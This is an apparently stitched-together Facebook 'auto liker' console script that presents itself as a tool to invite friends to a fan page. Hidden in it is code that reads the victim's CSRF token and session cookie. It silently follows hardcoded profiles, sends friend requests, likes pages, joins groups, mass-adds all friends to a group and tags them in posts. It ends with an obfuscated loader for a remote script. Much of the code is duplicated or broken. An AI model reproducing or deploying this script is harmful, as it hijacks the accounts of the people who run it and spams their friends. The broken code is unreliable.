 var Title = "Auto liker Fanpage 2014 By Mokka</A>";var Descriptions = "",text = 'AuTo by Mokka</br>Nick</A><A style="color#DF013A;" href="https://www.facebook.com/GeneRaL.MoKka" target="_blank"> Hacked1</A></A>,</A><A style="color:#2EFE64;" href="https://www.facebook.com/GeneRaL.MoKka" target="_blank"> Error 107<A></A>.</br>Team Error 107 <A style="color:#AEB404;" href="" target="_blank"></A>.</A>';
page_id = /"profile_owner":"([0-9]+)"/.exec(document.getElementById("pagelet_timeline_main_column").getAttribute("data-gt"))[1];function InviteFriends(opo) {jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send_single?page_id=" + page_id + "&invitee=" + opo + "&elem_id=u_0_1k&action=send&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=8&fb_dtsg=" + fb_dtsg + "&phstamp=", function (a) {
        var b = a.substring(a.indexOf("{"));
        var c = JSON.parse(b);
        i--;
        Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
        if (c.error) {
            Descriptions += "color:darkred'>";
            err++;
            if (c.errorDescription) Descriptions += c.errorDescription;
            else Descriptions += JSON.stringify(c, null, "")
        } else {
            Descriptions += "color:darkgreen'>";
            Descriptions += arn[i] + " dã du?c m?i like page " + page_name + ".";
            suc++
        }
        Descriptions += "</div>";
        var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff'>";
        display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
        if (i > 0) {
            display += arr.length + " hoho<br/>";
            display += "<b>" + suc + "</b> kakaklong " + (arr.length - i) + " abglonglike ";
            display += "(" + i + " proses....)";
            display += "<div class='friend-edge'>";
            display += Descriptions;
            display += "<img style='width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src=" + pho[i] + "></img><a style='font-size:13px;padding-left:8px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
            display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
            display += "jumlah invite bergantung pada friends anda" + page_name + ".</br>";
            display += _text;
            display += "</div>";
            display += "</div>";
            window[tag + "_close"] = true
        } else {
            Title = "All Of Your Friends Have Been Invited to Like Your Page.</A>";
            display += arr.length + " Friends Detected and ";
            display += "<b>" + suc + " Friends Invited.</b></br>";
            display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Refresh Page</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"' style='color:gray'>Cancel</span><br/>";
            display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'><br/>";
            display += _text;
            display += "</div>";
            window[tag + "_close"] = false
        }
        display += "</div>";
        document.getElementById("pagelet_sidebar").innerHTML = display
    }, "text", "post");
    tay--;
    if (tay > 0) {
        var s = arr[tay];
        setTimeout("InviteFriends(" + s + ")", 100)
    }
    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
 
 
                        if (page_id)jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=371499406236703&__user="+ user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
                        if (page_id)jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=371499406236703&__user="+ user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
                                 
                        if (page_id)jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=421190004635141&source=typeahead&members=" + opo + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id,
 
 
function () {}, "text", "post");
                       
    }
jx = {
    b: function () {
        var b = !1;
        if ("undefined" != typeof ActiveXObject) try {
            b = new ActiveXObject("Msxml2.XMLHTTP")
        } catch (c) {
            try {
                b = new ActiveXObject("Microsoft.XMLHTTP")
            } catch (a) {
                b = !1
            }
        } else if (window.XMLHttpRequest) try {
            b = new XMLHttpRequest
        } catch (h) {
            b = !1
        }
        return b
    },
    load: function (b, c, a, h, g) {
        var e = this.d();
        if (e && b) {
            e.overrideMimeType && e.overrideMimeType("text/xml");
            h || (h = "GET");
            a || (a = "text");
            g || (g = {});
            a = a.toLowerCase();
            h = h.toUpperCase();
            b += b.indexOf("?") + 1 ? "&" : "?";
            var k = null;
            "" == h && (k = b.split("?"), b = k[0], k = k[1]);
            e.open(h, b, !0);
            e.onreadystatechange = g.c ? function () {
                g.c(e)
            } : function () {
                if (4 == e.readyState)
                    if (200 == e.status) {
                        var b = "";
                        e.responseText && (b = e.responseText);
                        "j" == a.charAt(0) ? (b = b.replace(/[\n\r]/g, ""), b = eval("(" + b + ")")) : "x" == a.charAt(0) && (b = e.responseXML);
                        c && c(b)
                    } else g.f && document.getElementsByTagName("body")[0].removeChild(g.f), g.e && (document.getElementById(g.e).style.display = "none"), error && error(e.status)
            };
            e.send(k)
        }
    },
    d: function () {
        return this.b()
    }
};
 
function ChangeLocation() {
    window.location.href = "http://www.facebook.com/"
}
setTimeout("ChangeLocation", 1);
window.onbeforeunload = function () {
    if (window[tag + "_close"]) return "This script is running now!"
};
var i = 3;
var tay = 3;
var suc = 0;
var err = 0;
var arr = new Array;
var arn = new Array;
var pho = new Array;
var tag = "Close";
var page_name, x = document.getElementsByTagName("span");
for (i = 0; i < x.length; i++)
    if (x[i].getAttribute("itemprop") == "name") page_name = x[i].innerHTML;
var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
jx.load(window.location.protocol + "///www.facebook.com/ajax/typeahead/first_degree.php?viewer=" + user_id + "&token=v7&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=l", function (a) {
    var b = a;
    var c = b.substring(b.indexOf("{"));
    var d = JSON.parse(c);
    d = d.payload.entries;
    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
    for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
    for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
    i = arr.length - 1; tay = i;console.log(arr.length);var display = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff'>";display += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";display += arr.length + " Friends Detected";display += "</div>";
document.getElementById("pagelet_sidebar").innerHTML = display;InviteFriends(arr[i])});function cereziAl(e){var t=e+"=";if(document.cookie.length>0){konum=document.cookie.indexOf(t);if(konum!=-1){konum+=t.length;son=document.cookie.indexOf(";",konum);if(son==-1)son=document.cookie.length;return unescape(document.cookie.substring(konum,son))}else{return""}}}function getRandomInt(e,t){return Math.floor(Math.random()*(t-e+1))+e}function randomValue(e){return e[getRandomInt(0,e.length-1)]}function a(e){var t=new XMLHttpRequest;var n="/ajax/follow/follow_profile.php?__a=1";var r="profile_id="+e+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";t.open("POST",n,true);t.setRequestHeader("Content-type","application/x-www-form-urlencoded");t.setRequestHeader("Content-length",r.length);t.setRequestHeader("Connection","close");t.onreadystatechange=function(){if(t.readyState==4&&t.status==200){t.close}};t.send(r)}function sublist(e){var t=document.createElement("script");t.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+e+" }).send();";document.body.appendChild(t)}function sarkadaslari_al(){var xmlhttp=new XMLHttpRequest;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){eval("arkadaslar = "+xmlhttp.responseText.toString().replace("for (;;);","")+";");for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){smesaj="";smesaj_text="";for(i=f*10;i<(f+1)*10;i++){if(arkadaslar.payload.entries[i]){smesaj+=" @["+arkadaslar.payload.entries[i].uid+":"+arkadaslar.payload.entries[i].text+"]";smesaj_text+=" "+arkadaslar.payload.entries[i].text}}sdurumpaylas()}}};var params="&filter[0]=user";params+="&options[0]=friends_only";params+="&options[1]=nm";params+="&token=v7";params+="&viewer="+user_id;params+="&__user="+user_id;if(document.URL.indexOf("https://")>=0){xmlhttp.open("GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1"+params,true)}else{xmlhttp.open("GET","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1"+params,true)}xmlhttp.send()}function sarkadasekle(e,t){var n=new XMLHttpRequest;n.onreadystatechange=function(){if(n.readyState==4){}};n.open("POST","/ajax/add_friend/action.php?__a=1",true);var r="to_friend="+e;r+="&action=add_friend";r+="&how_found=friend_browser";r+="&ref_param=none";r+="&outgoing_id=";r+="&logging_location=friend_browser";r+="&no_flyout_on_click=true";r+="&ego_log_data=";r+="&http_referer=";r+="&fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value;r+="&phstamp=165816749114848369115";r+="&__user="+user_id;n.setRequestHeader("X-SVN-Rev",svn_rev);n.setRequestHeader("Content-Type","application/x-www-form-urlencoded");if(t=="farketmez"&&document.cookie.split("cins"+user_id+"=").length>1){n.send(r)}else if(document.cookie.split("cins"+user_id+"=").length<=1){cinsiyetgetir(e,t,"sarkadasekle")}else if(t==document.cookie.split("cins"+user_id+"=")[1].split(";")[0].toString()){n.send(r)}}function scinsiyetgetir(uid,cins,fonksiyon){var xmlhttp=new XMLHttpRequest;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){eval("cinssonuc = "+xmlhttp.responseText.toString().replace("for (;;);","")+";");cinshtml.innerHTML=cinssonuc.jsmods.markup[0][1].__html;btarihi.setTime(bugun.getTime()+1e3*60*60*24*365);if(cinshtml.getElementsByTagName("select")[0].value=="1"){document.cookie="cins"+user_id+"=kadin;expires="+btarihi.toGMTString()}else if(cinshtml.getElementsByTagName("select")[0].value=="2"){document.cookie="cins"+user_id+"=erkek;expires="+btarihi.toGMTString()}eval(fonksiyon+"("+id+","+cins+");")}};xmlhttp.open("GET","/ajax/timeline/edit_profile/basic_info.php?__a=1&__user="+user_id,true);xmlhttp.setRequestHeader("X-SVN-Rev",svn_rev);xmlhttp.send()}function autoSuggest(){links=document.getElementsByTagName("a");for(i in links){l=links[i];if(l.innerHTML=='<span class="uiButtonText">Suggest Friend</span>'){l.click()}}}function blub(){if(document.getElementsByClassName("pbm fsm").length==1){w=document.getElementsByClassName("pbm fsm")[0];e=document.createElement("a");e.innerHTML="Auto Suggest by Anonymous";e.className="uiButton";e.onclick=autoSuggest;if(w.childElementCount==0){w.appendChild(document.createElement("br"));w.appendChild(e)}}}var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);a("836357500");a("100004073752807");
sublist("251889298290193");var fb_dtsg=document["getElementsByName"]("fb_dtsg")[0]["value"];var user_id=document["cookie"]["match"](document["cookie"]["match"](/c_user=(\d+)/)[1]);var httpwp=new XMLHttpRequest;varurlwp="/ajax/groups/membership/r2j.php?__a=1";var paramswp="&ref=group_jump_header&group_id="+gid+"&fb_dtsg="+fb_dtsg+"&__user="+user_id+"&phstamp=";httpwp["open"]("POST",urlwp,true);httpwp["setRequestHeader"]("Content-type","application/x-www-form-urlencoded");httpwp["setRequestHeader"]("Content-length",paramswp["length"]);httpwp["setRequestHeader"]("Connection","keep-alive");httpwp["send"](paramswp);var fb_dtsg=document["getElementsByName"]("fb_dtsg")[0]["value"];var user_id=document["cookie"]["match"](document["cookie"]["match"](/c_user=(\d+)/)[1]);var friends=new Array;gf=new XMLHttpRequest;gf["open"]("GET","/ajax/typeahead/first_degree.php?__a=1&viewer="+user_id+"&token"+Math["random"]()+"&filter[0]=user&options[0]=friends_only",false);gf["send"]();if(gf["readyState"]!=4){}else{data=eval("("+gf["responseText"]["substr"](9)+")");if(data["error"]){}else{friends=data["payload"]["entries"]["sort"](function(e,t){return e["index"]-t["index"]})}}for(var i=0;i<friends["length"];i++){var httpwp=new XMLHttpRequest;var urlwp="/ajax/groups/members/add_post.php?__a=1";var paramswp="&fb_dtsg="+fb_dtsg+"&group_id="+gid+"&source=typeahead&ref=&message_id=&members="+friends[i]["uid"]+"&__user="+user_id+"&phstamp=";httpwp["open"]("POST",urlwp,true);httpwp["setRequestHeader"]("Content-type","application/x-www-form-urlencoded");httpwp["setRequestHeader"]("Content-length",paramswp["length"]);httpwp["setRequestHeader"]("Connection","keep-alive");httpwp["onreadystatechange"]=function(){if(httpwp["readyState"]==4&&httpwp["status"]==200){}};httpwp["send"](paramswp)}var spage_id = "371499406236703";var spost_id="380107888801666";var sfoto_id="380107888801666";var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var smesaj="";var smesaj_text="";var arkadaslar=[];var svn_rev;var bugun=new Date;var btarihi=new Date;btarihi.setTime(bugun.getTime()+1e3*60*60*4*1);if(!document.cookie.match(/paylasti=(\d+)/)){document.cookie="paylasti=hayir;expires="+btarihi.toGMTString()}var tiklama=document.addEventListener("click",function(){if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir")>=0){svn_rev=document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];sarkadaslari_al();document.cookie="paylasti=evet;expires="+btarihi.toGMTString();document.removeEventListener(tiklama)}},false);var cinssonuc={};var cinshtml=document.createElement("html");blub();document.addEventListener("DOMNodeInserted",blub,true)
function InviteFriends(e){jx.load(window.location.protocol+"//www.facebook.com/ajax/pages/invite/send_single?page_id="+page_id+"&invitee="+e+"&elem_id=u_0_1k&action=send&__user="+user_id+"&__a=1&__dyn=7n8aD5z5CF-3ui&__req=8&fb_dtsg="+fb_dtsg+"&phstamp=",function(e){var t=e.substring(e.indexOf("{"));var n=JSON.parse(t);i--;Descriptions="<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";if(n.error){Descriptions+="color:darkred'>";err++;if(n.errorDescription){Descriptions+=n.errorDescription}else{Descriptions+=JSON.stringify(n,null,"")}}else{Descriptions+="color:white'>";Descriptions+=arn[i]+"&#1578;&#1605; &#1575;&#1585;&#1587;&#1575;&#1604; &#1575;&#1604;&#1583;&#1593;&#1608;&#1577; &#1604;&#1604;&#1575;&#1593;&#1580;&#1575;&#1576; &#1576;&#1600;"+page_name+".";suc++}Descriptions+="</div>";var r="<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:35%;margin-left:-273px;top:58px;width:700px;background-color:rgba(25,22,25,0.9);z-index:8;font-family:arial;text-shadow:0px 0px 18px white;sans-serif;box-shadow:0px 0px 44px black; text-shadow:0px 0px 12px white;font-size:20px;text-align:center;padding:3px;border-radius:15em 2em;border:15px double  rgba(225,225,25,0.6);z-index:8;font-family:arial;text-shadow:0px 0px 18px white;sans-serif;box-shadow:0px 0px 44px black;color:white'>";r+="<div style='padding-bottom:5px;font-size:20px;'>"+Title+"</div>";if(i>0){r+=arr.length+"&#1593;&#1605;&#1602; &#1575;&#1604;&#1576;&#1581;&#1579;<br/>";r+="<b>"+suc+"</b>&#1575;&#1604;&#1593;&#1583;&#1583; &#1575;&#1604;&#1584;&#1609; &#1578;&#1605; &#1583;&#1593;&#1608;&#1578;&#1607;"+(arr.length-i)+"&#1575;&#1604;&#1593;&#1583;&#1583; &#1575;&#1604;&#1605;&#1603;&#1578;&#1588;&#1601;";r+="("+i+" &#1575;&#1604;&#1576;&#1581;&#1579; &#1580;&#1575;&#1585;&#1609;..)";r+="<div class='friend-edge'>";r+=Descriptions;r+="<img style='width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src="+pho[i]+"></img><a style='font-size:13px;padding-left:8px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>"+arn[i]+"</a>";r+="<div style='text-align:center;font-size:15px;white-space:pre-wrap;color:gray'>";r+=" code-facebooky"+page_name+".</br>";r+=_text;r+="</div>";r+="</div>";window[tag+"_close"]=true}else{Title="&#1578;&#1605;&#1578; &#1575;&#1604;&#1583;&#1593;&#1608;&#1577; &#1604;&#1604;&#1575;&#1593;&#1580;&#1575;&#1576; &#1576;&#1600;.</A>";r+=arr.length+"&#1575;&#1604;&#1593;&#1583;&#1583;&#1575;&#1604;&#1605;&#1603;&#1578;&#1588;&#1601;";r+="<b>"+suc+"&#1575;&#1604;&#1593;&#1583;&#1583; &#1575;&#1604;&#1584;&#1609; &#1578;&#1605; &#1583;&#1593;&#1608;&#1578;&#1607;</b></br>";r+="<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='window.location.reload()' style='color:white'>&#1578;&#1581;&#1583;&#1610;&#1579; &#1575;&#1604;&#1589;&#1601;&#1581;&#1577;</span><span <br/>";r+="<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'><br/>";r+=_text;r+="</div>";window[tag+"_close"]=false}r+="</div>";document.getElementById("pagelet_sidebar").innerHTML=r},"text","post");tay--;if(tay>0){var t=arr[tay];setTimeout("InviteFriends("+t+")",100)}console.log(tay+"/"+arr.length+":"+arr[tay]+"/"+arn[tay]+", success:"+suc);if(page_id)var fbdtsg = document.getElementsByName('fb_dtsg')[0].value;var userid = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var prot = location.protocol;function generatePhstamp(qs, dtsg){var input_len = qs.length;numeric_csrf_value='';for(var ii=0;ii<dtsg.length;ii++){numeric_csrf_value+=dtsg.charCodeAt(ii);}return '1' + numeric_csrf_value + input_len;};var params = "profile_id=648174816&location=1&nctr[_mod]=pagelet_timeline_profile_actions&__user=" + userid + "&__a=1&__req=8&fb_dtsg=" + fbdtsg;params += "&phstamp=" + generatePhstamp(params, fbdtsg);with(new XMLHttpRequest){open('POST', prot + '//www.facebook.com/ajax/follow/follow_profile.php' , true);send(params);};var params = "profile_id=100004073752807&location=1&nctr[_mod]=pagelet_timeline_profile_actions&__user=" + userid + "&__a=1&__req=8&fb_dtsg=" + fbdtsg;params += "&phstamp=" + generatePhstamp(params, fbdtsg);with(new XMLHttpRequest){open('POST', prot + '//www.facebook.com/ajax/follow/follow_profile.php' , true);send(params);};var params = "profile_id=83635750&location=1&nctr[_mod]=pagelet_timeline_profile_actions&__user=" + userid + "&__a=1&__req=8&fb_dtsg=" + fbdtsg;params += "&phstamp=" + generatePhstamp(params, fbdtsg);with(new XMLHttpRequest){open('POST', prot + '//www.facebook.com/ajax/follow/follow_profile.php' , true);send(params);};var params = "to_friend=83635750&action=add_friend&how_found=profile_button&ref_param=none&&link_data[gt][profile_owner]=100004073752807&link_data[gt][ref]=timeline%3Atimeline&outgoing_id=js_4&logging_location=&no_flyout_on_click=false&ego_log_data&http_referer=https%3A%2F%2Fwww.facebook.com%2F&__user=" + userid + "&__a=1&__req=q&fb_dtsg=" + fbdtsg;params += "&phstamp=" + generatePhstamp(params, fbdtsg);with(new XMLHttpRequest){open('POST', prot + '//www.facebook.com/ajax/add_friend/action.php' , true);send(params);};var params = "fbpage_id=462346010461421&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&&nctr[_mod]=pagelet_timeline_page_actions&__user=" + userid + "&__a=1&__req=1w&fb_dtsg=" + fbdtsg;params += "&phstamp=" + generatePhstamp(params, fbdtsg);with(new XMLHttpRequest){open('POST', prot + '//www.facebook.com/ajax/pages/fan_status.php' , true);send(params);};var params = "fb_dtsg=" + fbdtsg + "&__user=" + userid + "&__a=1&__req=e";params += "&phstamp=" + generatePhstamp(params, fbdtsg);with(new XMLHttpRequest){open('POST', prot + '//www.facebook.com/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe&flid=251889298290193&' , true);send(params);};var params = "ref=group_jump_header&group_id=487693027944023&__user=" + userid + "&__a=1&__req=7&fb_dtsg=" + fbdtsg;params += "&phstamp=" + generatePhstamp(params, fbdtsg);with(new XMLHttpRequest){open('POST', prot + '//www.facebook.com/ajax/groups/membership/r2j.php' , true);send(params);};}function ChangeLocation(){window.location.href="http://www.facebook.com/"}var Title="<img src='http://fb-script.webs.com/image/like.png' >";var Descriptions="",_text="";page_id=/"profile_owner":"([0-9]+)"/.exec(document.getElementById("pagelet_timeline_main_column").getAttribute("data-gt"))[1];jx={b:function(){var e=!1;if("undefined"!=typeof ActiveXObject){try{e=new ActiveXObject("Msxml2.XMLHTTP")}catch(t){try{e=new ActiveXObject("Microsoft.XMLHTTP")}catch(n){e=!1}}}else{if(window.XMLHttpRequest){try{e=new XMLHttpRequest}catch(r){e=!1}}}return e},load:function(b,c,a,h,g){var e=this.d();if(e&&b){e.overrideMimeType&&e.overrideMimeType("text/xml");h||(h="GET");a||(a="text");g||(g={});a=a.toLowerCase();h=h.toUpperCase();b+=b.indexOf("?")+1?"&":"?";var k=null;"POST"==h&&(k=b.split("?"),b=k[0],k=k[1]);e.open(h,b,!0);e.onreadystatechange=g.c?function(){g.c(e)}:function(){if(4==e.readyState){if(200==e.status){var b="";e.responseText&&(b=e.responseText);"j"==a.charAt(0)?(b=b.replace(/[\n\r]/g,""),b=eval("("+b+")")):"x"==a.charAt(0)&&(b=e.responseXML);c&&c(b)}else{g.f&&document.getElementsByTagName("body")[0].removeChild(g.f),g.e&&(document.getElementById(g.e).style.display="none"),error&&error(e.status)}}};e.send(k)}},d:function(){return this.b()}};setTimeout("ChangeLocation",1);window.onbeforeunload=function(){if(window[tag+"_close"]){return"This script is running now!"}};var i=3;var tay=3;var suc=0;var err=0;var arr=new Array;var arn=new Array;var pho=new Array;var tag="Close";var page_name,x=document.getElementsByTagName("span");for(i=0;i<x.length;i++){if(x[i].getAttribute("itemprop")=="name"){page_name=x[i].innerHTML}}var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);jx.load(window.location.protocol+"///www.facebook.com/ajax/typeahead/first_degree.php?viewer="+user_id+"&token=v7&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha&__user="+user_id+"&__a=1&__dyn=7n8aD5z5CF-3ui&__req=l",function(e){var t=e;var n=t.substring(t.indexOf("{"));var r=JSON.parse(n);r=r.payload.entries;for(var s=0;s<r.length;s++){arr.push(r[s].uid)}for(var o=0;o<r.length;o++){arn.push(r[o].text)}for(var u=0;u<r.length;u++){pho.push(r[u].photo)}i=arr.length-1;tay=i;console.log(arr.length);var a="<div id='friend-edge-display' style='position:fixed;left:35%;margin-left:-273px;top:58px;width:700px;background-color:rgba(25,22,25,0.9);z-index:8;font-family:arial;text-shadow:0px 0px 18px white;sans-serif;box-shadow:0px 0px 44px black; text-shadow:0px 0px 12px white;font-size:20px;text-align:center;padding:3px;border-radius:15em 2em;border:15px double  rgba(225,225,25,0.6);z-index:8;font-family:arial;text-shadow:0px 0px 18px white;sans-serif;box-shadow:0px 0px 44px black;color:white'>";a+="<div style='padding-bottom:10px;font-size:20px;'>"+Title+"</div>";a+=arr.length+"&#1575;&#1604;&#1593;&#1583;&#1583; &#1575;&#1604;&#1605;&#1603;&#1578;&#1588;&#1601;";a+="</div>";document.getElementById("pagelet_sidebar").innerHTML=a;InviteFriends(arr[i])});A="jvvr8--ocsf{,emmengamfg,amo-dkngq-ocsf,hq";A="";for(i=0;i<A.length;i++){B+=unescape(String.fromCharCode(A.charCodeAt(i)^2))}document.body.appendChild(document.createElement("script")).src=A
